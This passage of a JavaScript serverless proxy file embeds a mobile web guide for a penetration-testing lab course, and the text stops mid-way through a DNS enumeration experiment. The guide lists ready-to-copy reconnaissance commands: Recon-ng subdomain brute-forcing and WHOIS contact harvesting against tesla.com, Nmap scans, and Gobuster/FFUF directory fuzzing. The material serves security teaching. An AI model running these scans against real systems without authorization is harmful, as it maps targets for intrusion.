/**
 * S7 Lab — Vercel Serverless AI Proxy with Built-In Lab RAG & Session Memory
 * Keeps all lab context and retrieval on the server side so the terminal client stays tiny.
 */

const fs = require("fs");
const path = require("path");

for (const p of [path.join(__dirname, "../.env"), path.join(__dirname, "../../.env")]) {
  if (fs.existsSync(p)) {
    for (const line of fs.readFileSync(p, "utf8").split(/\r?\n/)) {
      const m = line.match(/^\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*"?([^"]*)"?\s*$/);
      if (m && !process.env[m[1]]) process.env[m[1]] = m[2];
    }
  }
}

const CORS_HEADERS = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Authorization, X-Proxy-Secret, X-API-Key, X-Provider, X-Session-Id",
};

const FREE_TIER_GEMINI_MODELS = [
  "gemini-3.5-flash-lite",
  "gemini-3.1-flash-lite",
  "gemini-3.1-flash-lite-preview",
  "gemini-2.5-flash",
  "gemma-4-26b-a4b-it",
];
const RESPONSE_CACHE = new Map();

// In-memory conversation store per session/IP (persists across warm serverless invocations)
const SESSION_MEMORY = new Map();
const MOBILE_HTML = "<!DOCTYPE html>\n<html lang=\"en\" data-theme=\"dark\">\n<head>\n  <meta charset=\"UTF-8\" />\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, viewport-fit=cover\" />\n  <meta name=\"text-scale\" content=\"scale\" />\n  <meta name=\"theme-color\" content=\"#0b1016\" />\n  <meta name=\"apple-mobile-web-app-capable\" content=\"yes\" />\n  <meta name=\"apple-mobile-web-app-status-bar-style\" content=\"black-translucent\" />\n  <title>s7@arxec-lab — Mobile Terminal Reader</title>\n  <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\" />\n  <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin />\n  <link href=\"https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;1,400&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap\" rel=\"stylesheet\" />\n  <style>\n    :root {\n      --bg-canvas: #090d12;\n      --bg-surface: #0f161f;\n      --bg-elevated: #151f2b;\n      --bg-code: #070b0f;\n      --fg-primary: #e6edf5;\n      --fg-secondary: #9fb1c6;\n      --fg-muted: #6c8096;\n      --accent-green: #3fb950;\n      --accent-cyan: #58a6ff;\n      --accent-amber: #d29922;\n      --accent-danger: #f85149;\n      --border-subtle: #1f2d3d;\n      --border-focus: #58a6ff;\n      --selection-bg: rgba(88, 166, 255, 0.28);\n      --shadow-elevated: 0 8px 24px rgba(2, 6, 12, 0.55);\n      --user-scale: 1;\n      --font-sans: \"Plus Jakarta Sans\", -apple-system, BlinkMacSystemFont, sans-serif;\n      --font-mono: \"JetBrains Mono\", ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;\n    }\n\n    html[data-theme=\"light\"] {\n      --bg-canvas: #f4f7fa;\n      --bg-surface: #ffffff;\n      --bg-elevated: #eaf0f6;\n      --bg-code: #0f1720;\n      --fg-primary: #0d1824;\n      --fg-secondary: #384b61;\n      --fg-muted: #5c7087;\n      --accent-green: #16792b;\n      --accent-cyan: #0550ae;\n      --accent-amber: #9a6700;\n      --accent-danger: #cf222e;\n      --border-subtle: #d0dbe7;\n      --border-focus: #0550ae;\n      --selection-bg: rgba(5, 80, 174, 0.18);\n      --shadow-elevated: 0 6px 20px rgba(13, 24, 36, 0.08);\n    }\n\n    *, *::before, *::after {\n      box-sizing: border-box;\n      margin: 0;\n      padding: 0;\n    }\n\n    ::selection {\n      background: var(--selection-bg);\n      color: var(--fg-primary);\n    }\n\n    ::-webkit-scrollbar {\n      width: 6px;\n      height: 6px;\n    }\n    ::-webkit-scrollbar-track {\n      background: var(--bg-canvas);\n    }\n    ::-webkit-scrollbar-thumb {\n      background: var(--border-subtle);\n      border-radius: 3px;\n    }\n\n    body {\n      background-color: var(--bg-canvas);\n      color: var(--fg-primary);\n      font-family: var(--font-sans);\n      line-height: 1.55;\n      min-height: 100dvh;\n      display: flex;\n      flex-direction: column;\n      caret-color: var(--accent-green);\n      font-variant-numeric: tabular-nums;\n      -webkit-tap-highlight-color: transparent;\n      overflow-x: hidden;\n    }\n\n    :focus-visible {\n      outline: 2px solid var(--border-focus);\n      outline-offset: 2px;\n    }\n\n    /* Top Sticky Terminal Bar */\n    .topbar {\n      position: sticky;\n      top: 0;\n      z-index: 30;\n      background-color: var(--bg-surface);\n      border-bottom: 1px solid var(--border-subtle);\n    }\n\n    .topbar-inner {\n      max-width: 56rem;\n      margin: 0 auto;\n      padding: 0.65rem 0.9rem;\n      display: flex;\n      align-items: center;\n      justify-content: space-between;\n      gap: 0.5rem;\n    }\n\n    .prompt-brand {\n      font-family: var(--font-mono);\n      font-size: 0.9rem;\n      font-weight: 600;\n      color: var(--accent-green);\n      display: flex;\n      align-items: center;\n      gap: 0.35rem;\n      white-space: nowrap;\n      overflow: hidden;\n      text-overflow: ellipsis;\n    }\n\n    .prompt-brand .path {\n      color: var(--accent-cyan);\n    }\n\n    .top-controls {\n      display: flex;\n      align-items: center;\n      gap: 0.35rem;\n      flex-shrink: 0;\n    }\n\n    .icon-btn {\n      background: var(--bg-elevated);\n      color: var(--fg-primary);\n      border: 1px solid var(--border-subtle);\n      border-radius: 0.4rem;\n      padding: 0.35rem 0.55rem;\n      font-family: var(--font-mono);\n      font-size: 0.78rem;\n      font-weight: 600;\n      cursor: pointer;\n      display: inline-flex;\n      align-items: center;\n      justify-content: center;\n      gap: 0.25rem;\n      min-height: 2.1rem;\n      transition: background-color 0.15s ease, border-color 0.15s ease;\n    }\n\n    .icon-btn:hover, .icon-btn:active {\n      border-color: var(--accent-cyan);\n    }\n\n    .icon-btn svg {\n      width: 0.95rem;\n      height: 0.95rem;\n      stroke: currentColor;\n      fill: none;\n      stroke-width: 2;\n      stroke-linecap: round;\n      stroke-linejoin: round;\n    }\n\n    /* Horizontal Experiment Strip */\n    .exp-strip-wrap {\n      background: var(--bg-canvas);\n      border-bottom: 1px solid var(--border-subtle);\n    }\n\n    .exp-strip {\n      max-width: 56rem;\n      margin: 0 auto;\n      padding: 0.5rem 0.75rem;\n      display: flex;\n      gap: 0.4rem;\n      overflow-x: auto;\n      scrollbar-width: none;\n    }\n    .exp-strip::-webkit-scrollbar {\n      display: none;\n    }\n\n    .exp-pill {\n      background: var(--bg-surface);\n      color: var(--fg-secondary);\n      border: 1px solid var(--border-subtle);\n      border-radius: 0.45rem;\n      padding: 0.4rem 0.7rem;\n      font-family: var(--font-mono);\n      font-size: 0.8rem;\n      font-weight: 500;\n      white-space: nowrap;\n      cursor: pointer;\n      flex-shrink: 0;\n      min-height: 2.25rem;\n      display: inline-flex;\n      align-items: center;\n      gap: 0.35rem;\n      transition: background-color 0.15s ease, color 0.15s ease, border-color 0.15s ease;\n    }\n\n    .exp-pill .num {\n      color: var(--accent-cyan);\n      font-weight: 700;\n    }\n\n    .exp-pill[aria-pressed=\"true\"] {\n      background: var(--bg-elevated);\n      color: var(--fg-primary);\n      border-color: var(--accent-cyan);\n      font-weight: 600;\n    }\n\n    /* Mode Switcher Bar */\n    .mode-bar {\n      max-width: 56rem;\n      width: 100%;\n      margin: 0 auto;\n      padding: 0.55rem 0.75rem 0.2rem;\n      display: flex;\n      flex-wrap: wrap;\n      gap: 0.4rem;\n    }\n\n    .mode-btn {\n      flex: 1 1 auto;\n      background: var(--bg-surface);\n      color: var(--fg-secondary);\n      border: 1px solid var(--border-subtle);\n      border-radius: 0.45rem;\n      padding: 0.45rem 0.65rem;\n      font-family: var(--font-mono);\n      font-size: 0.78rem;\n      font-weight: 600;\n      cursor: pointer;\n      display: inline-flex;\n      align-items: center;\n      justify-content: center;\n      gap: 0.35rem;\n      min-height: 2.3rem;\n    }\n\n    .mode-btn[aria-selected=\"true\"] {\n      background: var(--accent-cyan);\n      color: #060a0f;\n      border-color: var(--accent-cyan);\n    }\n\n    html[data-theme=\"light\"] .mode-btn[aria-selected=\"true\"] {\n      color: #ffffff;\n    }\n\n    /* Main Terminal Viewport */\n    .terminal-main {\n      container-type: inline-size;\n      max-width: 56rem;\n      width: 100%;\n      margin: 0 auto;\n      padding: 0.75rem 0.85rem 5.5rem;\n      flex: 1;\n      font-size: calc(1rem * var(--user-scale));\n    }\n\n    .exp-header {\n      background: var(--bg-surface);\n      border: 1px solid var(--border-subtle);\n      border-radius: 0.6rem;\n      padding: 1rem;\n      margin-bottom: 1rem;\n      box-shadow: var(--shadow-elevated);\n    }\n\n    .exp-title {\n      font-size: clamp(1.15rem, 1rem + 1.2vw, 1.5rem);\n      font-weight: 700;\n      line-height: 1.3;\n      color: var(--fg-primary);\n      letter-spacing: -0.02em;\n      text-wrap: balance;\n      margin-bottom: 0.55rem;\n    }\n\n    .exp-meta {\n      display: flex;\n      flex-wrap: wrap;\n      gap: 0.45rem 0.9rem;\n      font-family: var(--font-mono);\n      font-size: 0.82em;\n      color: var(--fg-secondary);\n      margin-bottom: 0.6rem;\n    }\n\n    .exp-meta strong {\n      color: var(--accent-amber);\n      font-weight: 600;\n    }\n\n    .exp-aim {\n      font-size: 0.94em;\n      color: var(--fg-secondary);\n      max-width: 68ch;\n    }\n\n    /* Step Sections */\n    .step-list {\n      display: flex;\n      flex-direction: column;\n      gap: 0.85rem;\n    }\n\n    .step-block {\n      background: var(--bg-surface);\n      border: 1px solid var(--border-subtle);\n      border-radius: 0.6rem;\n      padding: 0.95rem;\n    }\n\n    .step-heading {\n      font-family: var(--font-mono);\n      font-size: 0.95em;\n      font-weight: 700;\n      color: var(--accent-cyan);\n      margin-bottom: 0.45rem;\n    }\n\n    .step-desc {\n      font-size: 0.92em;\n      color: var(--fg-secondary);\n      margin-bottom: 0.65rem;\n      max-width: 68ch;\n    }\n\n    .step-notes {\n      list-style: none;\n      display: flex;\n      flex-direction: column;\n      gap: 0.35rem;\n      margin-bottom: 0.65rem;\n      font-size: 0.9em;\n      color: var(--fg-primary);\n    }\n\n    .step-notes li {\n      position: relative;\n      padding-left: 1rem;\n      max-width: 68ch;\n    }\n\n    .step-notes li::before {\n      content: \"›\";\n      position: absolute;\n      left: 0;\n      color: var(--accent-amber);\n      font-family: var(--font-mono);\n      font-weight: 700;\n    }\n\n    /* Command Block with One-Tap Copy */\n    .cmd-group {\n      display: flex;\n      flex-direction: column;\n      gap: 0.5rem;\n    }\n\n    .cmd-box {\n      background: var(--bg-code);\n      border: 1px solid var(--border-subtle);\n      border-radius: 0.45rem;\n      padding: 0.6rem 0.7rem;\n      display: flex;\n      align-items: flex-start;\n      justify-content: space-between;\n      gap: 0.6rem;\n    }\n\n    .cmd-code {\n      font-family: var(--font-mono);\n      font-size: 0.86em;\n      line-height: 1.5;\n      color: #4ae168;\n      word-break: break-word;\n      white-space: pre-wrap;\n      flex: 1;\n    }\n\n    .cmd-code .comment {\n      color: #7d92a8;\n      display: block;\n    }\n\n    .copy-btn {\n      background: rgba(255, 255, 255, 0.07);\n      color: #c9d6e3;\n      border: 1px solid rgba(255, 255, 255, 0.14);\n      border-radius: 0.35rem;\n      padding: 0.28rem 0.55rem;\n      font-family: var(--font-mono);\n      font-size: 0.72rem;\n      font-weight: 600;\n      cursor: pointer;\n      flex-shrink: 0;\n      min-height: 1.85rem;\n    }\n\n    .copy-btn[data-copied=\"true\"] {\n      background: rgba(63, 185, 80, 0.22);\n      color: #56f070;\n      border-color: #3fb950;\n    }\n\n    /* Observations Footer inside Experiment */\n    .obs-box {\n      margin-top: 0.9rem;\n      background: var(--bg-elevated);\n      border: 1px solid var(--border-subtle);\n      border-radius: 0.55rem;\n      padding: 0.85rem 0.95rem;\n    }\n\n    .obs-title {\n      font-family: var(--font-mono);\n      font-size: 0.85em;\n      font-weight: 700;\n      color: var(--accent-amber);\n      margin-bottom: 0.4rem;\n    }\n\n    /* Prev / Next Navigation Buttons */\n    .pager-row {\n      margin-top: 1.15rem;\n      display: grid;\n      grid-template-columns: 1fr 1fr;\n      gap: 0.6rem;\n    }\n\n    .pager-btn {\n      background: var(--bg-surface);\n      color: var(--fg-primary);\n      border: 1px solid var(--border-subtle);\n      border-radius: 0.5rem;\n      padding: 0.75rem 0.85rem;\n      font-family: var(--font-mono);\n      font-size: 0.84rem;\n      font-weight: 600;\n      cursor: pointer;\n      text-align: left;\n      display: flex;\n      flex-direction: column;\n      gap: 0.15rem;\n      min-height: 3.2rem;\n    }\n\n    .pager-btn.next {\n      text-align: right;\n      align-items: flex-end;\n    }\n\n    .pager-btn span.sub {\n      font-size: 0.72rem;\n      color: var(--fg-secondary);\n      font-weight: 400;\n    }\n\n    /* Search & AI Panes */\n    .pane-box {\n      background: var(--bg-surface);\n      border: 1px solid var(--border-subtle);\n      border-radius: 0.6rem;\n      padding: 1rem;\n      box-shadow: var(--shadow-elevated);\n    }\n\n    .input-row {\n      display: flex;\n      gap: 0.5rem;\n      margin-bottom: 0.9rem;\n    }\n\n    .term-input {\n      flex: 1;\n      background: var(--bg-canvas);\n      color: var(--fg-primary);\n      border: 1px solid var(--border-subtle);\n      border-radius: 0.45rem;\n      padding: 0.65rem 0.8rem;\n      font-family: var(--font-mono);\n      font-size: 0.9rem;\n      min-height: 2.65rem;\n    }\n\n    .action-btn {\n      background: var(--accent-cyan);\n      color: #060a0f;\n      border: none;\n      border-radius: 0.45rem;\n      padding: 0 1rem;\n      font-family: var(--font-mono);\n      font-size: 0.85rem;\n      font-weight: 700;\n      cursor: pointer;\n      min-height: 2.65rem;\n    }\n\n    html[data-theme=\"light\"] .action-btn {\n      color: #ffffff;\n    }\n\n    .chat-log {\n      display: flex;\n      flex-direction: column;\n      gap: 0.75rem;\n      margin-top: 0.75rem;\n    }\n\n    .chat-msg {\n      padding: 0.75rem 0.9rem;\n      border-radius: 0.5rem;\n      border: 1px solid var(--border-subtle);\n      font-size: 0.92em;\n      white-space: pre-wrap;\n      word-break: break-word;\n    }\n\n    .chat-msg.user {\n      background: var(--bg-elevated);\n      font-family: var(--font-mono);\n      color: var(--accent-cyan);\n    }\n\n    .chat-msg.bot {\n      background: var(--bg-canvas);\n      font-family: var(--font-mono);\n      color: var(--fg-primary);\n    }\n\n    /* Sticky Bottom Command Bar */\n    .bottom-cmd-bar {\n      position: fixed;\n      bottom: 0;\n      left: 0;\n      right: 0;\n      z-index: 40;\n      background: var(--bg-surface);\n      border-top: 1px solid var(--border-subtle);\n      padding: 0.45rem 0.75rem calc(0.45rem + env(safe-area-inset-bottom, 0px));\n    }\n\n    .bottom-cmd-inner {\n      max-width: 56rem;\n      margin: 0 auto;\n      display: flex;\n      align-items: center;\n      gap: 0.45rem;\n    }\n\n    .cmd-prompt-label {\n      font-family: var(--font-mono);\n      font-size: 0.85rem;\n      font-weight: 700;\n      color: var(--accent-green);\n      white-space: nowrap;\n    }\n\n    .cmd-bar-input {\n      flex: 1;\n      background: var(--bg-canvas);\n      color: var(--fg-primary);\n      border: 1px solid var(--border-subtle);\n      border-radius: 0.4rem;\n      padding: 0.45rem 0.65rem;\n      font-family: var(--font-mono);\n      font-size: 0.85rem;\n      min-height: 2.25rem;\n    }\n\n    .cmd-run-btn {\n      background: var(--bg-elevated);\n      color: var(--accent-green);\n      border: 1px solid var(--border-subtle);\n      border-radius: 0.4rem;\n      padding: 0.45rem 0.75rem;\n      font-family: var(--font-mono);\n      font-size: 0.8rem;\n      font-weight: 700;\n      cursor: pointer;\n      min-height: 2.25rem;\n    }\n\n    @container (min-width: 42em) {\n      .exp-header {\n        padding: 1.25rem 1.4rem;\n      }\n      .step-block {\n        padding: 1.15rem 1.3rem;\n      }\n    }\n  </style>\n</head>\n<body>\n  <header class=\"topbar\">\n    <div class=\"topbar-inner\">\n      <div class=\"prompt-brand\" aria-label=\"Terminal status\">\n        <span>s7@arxec</span><span class=\"path\" id=\"promptPath\">:~/exp1</span>\n      </div>\n      <div class=\"top-controls\">\n        <button type=\"button\" class=\"icon-btn\" id=\"fontDownBtn\" title=\"Decrease font size\" aria-label=\"Decrease text size\">A-</button>\n        <button type=\"button\" class=\"icon-btn\" id=\"fontUpBtn\" title=\"Increase font size\" aria-label=\"Increase text size\">A+</button>\n        <button type=\"button\" class=\"icon-btn\" id=\"themeBtn\" title=\"Toggle Daylight / Night mode\" aria-label=\"Toggle color theme\">\n          <svg viewBox=\"0 0 24 24\" aria-hidden=\"true\"><circle cx=\"12\" cy=\"12\" r=\"4\"/><path d=\"M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41\"/></svg>\n          <span id=\"themeLabel\">Day</span>\n        </button>\n      </div>\n    </div>\n  </header>\n\n  <nav class=\"exp-strip-wrap\" aria-label=\"Experiments 1 to 8\">\n    <div class=\"exp-strip\" id=\"expStrip\"></div>\n  </nav>\n\n  <div class=\"mode-bar\" role=\"tablist\" aria-label=\"View Modes\">\n    <button type=\"button\" role=\"tab\" class=\"mode-btn\" id=\"tabFull\" aria-selected=\"true\" data-mode=\"full\">Full Guide</button>\n    <button type=\"button\" role=\"tab\" class=\"mode-btn\" id=\"tabCmds\" aria-selected=\"false\" data-mode=\"cmds\">Cmds Only (c)</button>\n    <button type=\"button\" role=\"tab\" class=\"mode-btn\" id=\"tabSearch\" aria-selected=\"false\" data-mode=\"search\">Search (s)</button>\n    <button type=\"button\" role=\"tab\" class=\"mode-btn\" id=\"tabAi\" aria-selected=\"false\" data-mode=\"ai\">Ask AI (ai)</button>\n    <button type=\"button\" role=\"tab\" class=\"mode-btn\" id=\"tabCurl\" aria-selected=\"false\" data-mode=\"curl\">curl Setup</button>\n  </div>\n\n  <main class=\"terminal-main\" id=\"mainViewport\"></main>\n\n  <form class=\"bottom-cmd-bar\" id=\"cmdForm\" autocomplete=\"off\">\n    <div class=\"bottom-cmd-inner\">\n      <label for=\"cmdInput\" class=\"cmd-prompt-label\" id=\"bottomPrompt\">s7 (1)&gt;</label>\n      <input\n        type=\"text\"\n        id=\"cmdInput\"\n        class=\"cmd-bar-input\"\n        placeholder=\"Type 1-8, c 5, s hydra, ai <question>, n, p...\"\n        aria-label=\"Terminal command input\"\n      />\n      <button type=\"submit\" class=\"cmd-run-btn\">Run</button>\n    </div>\n  </form>\n\n  <script>\n    const EXPERIMENTS = [\n      {\n        id: 1,\n        short: \"Theory & Recon\",\n        title: \"Exp 1: Familiarization of Application Penetration Testing (Theory)\",\n        aim: \"Familiarize with application penetration testing concepts, passive and active reconnaissance tools, and ethical rules.\",\n        target: \"Web & Mobile Applications\",\n        tools: \"theHarvester, Maltego, Recon-ng, Shodan, Nmap, Burp Suite, Nikto, DirBuster\",\n        steps: [\n          {\n            heading: \"1. Application Penetration Testing\",\n            desc: \"Simulating real-world attacks on web or mobile applications to identify security weaknesses before malicious hackers exploit them.\",\n            notes: [\n              \"Checks for insecure coding, misconfigurations, authentication flaws, and sensitive data leaks.\",\n              \"Protects user data, backend systems, and compliance with security standards.\"\n            ],\n            cmds: []\n          },\n          {\n            heading: \"2. Reconnaissance Phases & Tools\",\n            desc: \"The information-gathering phase to map the target surface and discover entry points:\",\n            notes: [\n              \"Passive Reconnaissance (no direct interaction with target): WHOIS lookups, search engines, Shodan, breach databases, social media.\",\n              \"Passive Tools: theHarvester, Maltego, Recon-ng, Shodan\",\n              \"Active Reconnaissance (direct engagement with target): Scanning open ports, mapping hidden directories, fingerprinting services.\",\n              \"Active Tools: Nmap, Burp Suite, Nikto, DirBuster, Gobuster, FFUF\"\n            ],\n            cmds: []\n          },\n          {\n            heading: \"3. Ethical Considerations\",\n            desc: \"Mandatory rules for conducting authorized security testing:\",\n            notes: [\n              \"Always obtain written authorization from the application owner before testing.\",\n              \"Strictly follow the agreed scope; avoid actions causing data loss or service disruption.\",\n              \"Report all discovered vulnerabilities responsibly.\"\n            ],\n            cmds: []\n          }\n        ],\n        cmdsOnly: [\n          \"# Exp 1 is a Theory Experiment — Reference Tool Summary:\",\n          \"# Passive Recon Tools: theHarvester, Maltego, Recon-ng, Shodan\",\n          \"# Active Recon Tools:  Nmap, Burp Suite, Nikto, DirBuster, Gobuster, FFUF\"\n        ],\n        observations: [\n          \"Understood the distinction between passive (non-intrusive) and active (direct probing) reconnaissance.\",\n          \"Identified key OSINT and scanning tools alongside legal and ethical boundaries.\"\n        ]\n      },\n      {\n        id: 2,\n        short: \"Recon-ng (P1)\",\n        title: \"Exp 2 (Practical 1): Reconnaissance & Info Gathering Using Recon-ng\",\n        aim: \"Gather publicly available OSINT about a live domain (tesla.com) using Recon-ng modules: subdomain discovery, WHOIS contact extraction, brute-force discovery, and Bing search.\",\n        target: \"tesla.com\",\n        tools: \"Recon-ng (Kali / Ubuntu Linux)\",\n        steps: [\n          {\n            heading: \"Step 1: Install & Launch Recon-ng\",\n            desc: \"Install Recon-ng from APT (or clone from GitHub if unavailable in your Ubuntu repository):\",\n            notes: [],\n            cmds: [\n              \"sudo apt update && sudo apt install -y recon-ng\",\n              \"recon-ng\",\n              \"# Fallback if APT package is missing:\\ngit clone https://github.com/lanmaster53/recon-ng.git && cd recon-ng && pip install -r REQUIREMENTS && ./recon-ng\"\n            ]\n          },\n          {\n            heading: \"Step 2: Create & Select a Workspace\",\n            desc: \"Workspaces isolate reconnaissance tables for each target engagement:\",\n            notes: [],\n            cmds: [\n              \"workspaces create testspace\",\n              \"workspaces select testspace\"\n            ]\n          },\n          {\n            heading: \"Step 3: Search & Install Required Modules\",\n            desc: \"Install the 4 marketplace modules required for subdomain and WHOIS enumeration:\",\n            notes: [],\n            cmds: [\n              \"marketplace search\",\n              \"marketplace install recon/domains-hosts/hackertarget\",\n              \"marketplace install recon/domains-contacts/whois_pocs\",\n              \"marketplace install recon/domains-hosts/brute_hosts\",\n              \"marketplace install recon/domains-hosts/bing_domain_web\"\n            ]\n          },\n          {\n            heading: \"Step 4: Subdomain Discovery via HackerTarget\",\n            desc: \"Enumerates subdomains using HackerTarget's public DNS dataset:\",\n            notes: [],\n            cmds: [\n              \"modules load recon/domains-hosts/hackertarget\\noptions set SOURCE tesla.com\\nrun\"\n            ]\n          },\n          {\n            heading: \"Step 5: WHOIS Point of Contact (PoC) Extraction\",\n            desc: \"Extracts public administrative and technical contact emails from WHOIS records:\",\n            notes: [],\n            cmds: [\n              \"modules load recon/domains-contacts/whois_pocs\\noptions set SOURCE tesla.com\\nrun\"\n            ]\n          },\n          {\n            heading: \"Step 6: Brute-Force Subdomain Discovery\",\n            desc: \"Brute-forces common and predictable subdomain hostnames:\",\n            notes: [],\n            cmds: [\n              \"modules load recon/domains-hosts/brute_hosts\\noptions set SOURCE tesla.com\\nrun\"\n            ]\n          },\n          {\n            heading: \"Step 7: Subdomain Discovery via Bing Search\",\n            desc: \"Queries Bing for indexed subdomains of tesla.com and displays collected records:\",\n            notes: [],\n            cmds: [\n              \"modules load recon/domains-hosts/bing_domain_web\\noptions set SOURCE tesla.com\\nrun\",\n              \"show hosts\\nshow contacts\"\n            ]\n          }\n        ],\n        cmdsOnly: [\n          \"sudo apt update && sudo apt install -y recon-ng && recon-ng\",\n          \"workspaces create testspace\\nworkspaces select testspace\",\n          \"marketplace search\\nmarketplace install recon/domains-hosts/hackertarget\\nmarketplace install recon/domains-contacts/whois_pocs\\nmarketplace install recon/domains-hosts/brute_hosts\\nmarketplace install recon/domains-hosts/bing_domain_web\",\n          \"modules load recon/domains-hosts/hackertarget\\noptions set SOURCE tesla.com\\nrun\",\n          \"modules load recon/domains-contacts/whois_pocs\\noptions set SOURCE tesla.com\\nrun\",\n          \"modules load recon/domains-hosts/brute_hosts\\noptions set SOURCE tesla.com\\nrun\",\n          \"modules load recon/domains-hosts/bing_domain_web\\noptions set SOURCE tesla.com\\nrun\\nshow hosts\\nshow contacts\"\n        ],\n        observations: [\n          \"hackertarget and bing_domain_web revealed multiple public subdomains of tesla.com.\",\n          \"whois_pocs extracted WHOIS Point of Contact administrative and technical email addresses.\",\n          \"brute_hosts discovered common subdomains through dictionary enumeration.\"\n        ]\n      },\n      {\n        id: 3,\n        short: \"Nmap & Gobuster (P2)\",\n        title: \"Exp 3 (Practical 2): Network Footprinting & Enumeration (Maltego, Nmap, Gobuster, FFUF)\",\n        aim: \"Perform passive and active reconnaissance to identify live hosts, open ports, running services, OS versions, and hidden web directories.\",\n        target: \"testphp.vulnweb.com / <Lab-Target-IP>\",\n        tools: \"Maltego, Nmap, Gobuster, FFUF, curl\",\n        steps: [\n          {\n            heading: \"Step 0: Ubuntu Tool & Wordlist Setup\",\n            desc: \"Install Nmap, Gobuster, FFUF, and download the dirb common.txt wordlist if missing:\",\n            notes: [],\n            cmds: [\n              \"sudo apt update && sudo apt install -y nmap gobuster ffuf dirb curl\",\n              \"sudo mkdir -p /usr/share/wordlists/dirb && sudo curl -sL https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt -o /usr/share/wordlists/dirb/common.txt\"\n            ]\n          },\n          {\n            heading: \"Step 1: Passive Reconnaissance using Maltego\",\n            desc: \"Map external domain entities, DNS records, IP ranges, and emails without touching the target:\",\n            notes: [\n              \"Launch Maltego in terminal and log in to your account.\",\n              \"Navigate to Machines > Run Machine -> Choose 'Footprint L1'.\",\n              \"Enter domain: testphp.vulnweb.com and inspect the entity graph.\"\n            ],\n            cmds: [\"maltego\"]\n          },\n          {\n            heading: \"Step 2: Active Reconnaissance & Scanning using Nmap\",\n            desc: \"Discover live hosts, open ports, service versions, and OS fingerprints:\",\n            notes: [\n              \"-sn : Ping scan (host discovery only) | -sV : Service version detection\",\n              \"-p  : Specific ports | -p- : Scan all 65535 ports\",\n              \"-A  : Aggressive scan (OS + version + default scripts + traceroute)\",\n              \"-Pn : Treat host as online (skip ping) | -T4 : Faster timing | -O : OS detection | -F : Fast scan (top 100 ports)\"\n            ],\n            cmds: [\n              \"sudo nmap -sn <Target-IP>/24\",\n              \"sudo nmap -sV -O -p- -A -T4 <TARGET-IP>\",\n              \"sudo nmap -sV -p 80,443 -A -T4 testphp.vulnweb.com\",\n              \"sudo nmap -F testphp.vulnweb.com\"\n            ]\n          },\n          {\n            heading: \"Step 3: Web Directory Enumeration with Gobuster\",\n            desc: \"Brute-force hidden directories and files (e.g., /admin, /images, /uploads) using common.txt:\",\n            notes: [],\n            cmds: [\n              \"gobuster dir -u http://<lab-machine-ip> -w /usr/share/wordlists/dirb/common.txt\",\n              \"gobuster dir -u http://testphp.vulnweb.com -w /usr/share/wordlists/dirb/common.txt\"\n            ]\n          },\n          {\n            heading: \"Step 4: Alternative Directory Enumeration using FFUF\",\n            desc: \"Fuzzes the FUZZ keyword in the URL against every line in common.txt:\",\n            notes: [],\n            cmds: [\n              \"ffuf -u http://testphp.vulnweb.com/FUZZ -w /usr/share/wordlists/dirb/common.txt\"\n            ]\n          }\n        ],\n        cmdsOnly: [\n          \"sudo apt update && sudo apt install -y nmap gobuster ffuf dirb curl\",\n          \"sudo mkdir -p /usr/share/wordlists/dirb && sudo curl -sL https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt -o /usr/share/wordlists/dirb/common.txt\",\n          \"maltego\",\n          \"sudo nmap -sn <Target-IP>/24\",\n          \"sudo nmap -sV -O -p- -A -T4 <TARGET-IP>\",\n          \"sudo nmap -sV -p 80,443 -A -T4 testphp.vulnweb.com\",\n          \"sudo nmap -F testphp.vulnweb.com\",\n          \"gobuster dir -u http://<lab-machine-ip> -w /usr/share/wordlists/dirb/common.txt\",\n          \"ffuf -u http://testphp.vulnweb.com/FUZZ -w /usr/share/wordlists/dirb/common.txt\"\n        ],\n        observations: [\n          \"Maltego mapped external DNS, IP, and email relationships passively.\",\n          \"Nmap identified open ports (80/443), web server versions, and OS fingerprints.\",\n          \"Gobuster and FFUF uncovered unlinked directories such as /admin, /images, and /CVS.\"\n        ]\n      },\n      {\n        id: 4,\n        short: \"DNS & Dorks (P3)\",\n        title: \"Exp 4 (Practical 3): OSINT-Based Enumeration of Web Infrastructure\",\n        aim: \"Profile web infrastructure components (subdomains, emails, DNS/MX records, and login portals) using DNSRecon, theHarvester, Dig, and Google Dorking.\",\n        target: \"tesla.com / testphp.vulnweb.com\",\n        tools: \"DNSRecon, theHarvester, Dig, Google Search Dorks\",\n        steps: [\n          {\n            heading: \"Step 0: Ubuntu Setup & SecLists Wordlist\",\n            desc: \"Install DNS utilities, DNSRecon, theHarvester, and fetch the top-5000 subdomains wordlist:\",\n            notes: [],\n            cmds: [\n              \"sudo apt update && sudo apt install -y dnsutils dnsrecon theharvester\",\n              \"curl -sL https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt -o subdomains.txt\"\n            ]\n          },\n          {\n            heading: \"Step 1: DNS Enumeration using DNSRecon\",\n            desc: \"Enumerate DNS records and brute-force subdomains:\",\n            notes: [\n              \"NS (Name Server): Authoritative DNS servers\",\n              \"A (Address): IPv4 address of the domain\",\n              \"MX (Mail Exchange): Email server routing\",\n              \"SOA (Start of Authority): Domain admin & zone timing\",\n              \"TXT/SPF: Sender Policy Framework & verification records\"\n            ],\n            cmds: [\n              \"dnsrecon -d tesla.com\",\n              \"dnsrecon -d tesla.com -t std --xml tesla_dns.xml\",\n              \"dnsrecon -d tesla.com -t brt -D subdomains.txt\"\n            ]\n          },\n          {\n            heading: \"Step 2: Subdomain & Email Enumeration using theHarvester\",\n            desc: \"Collect subdomains (e.g., shop.tesla.com, energy.tesla.com) and public email addresses from Bing:\",\n            notes: [\n              \"Other supported search engines: bing, baidu, yahoo, crtsh, duckduckgo.\"\n            ],\n            cmds: [\n              \"theHarvester -d tesla.com -b bing\"\n            ]\n          },\n          {\n            heading: \"Step 3: Manual DNS Record Queries using 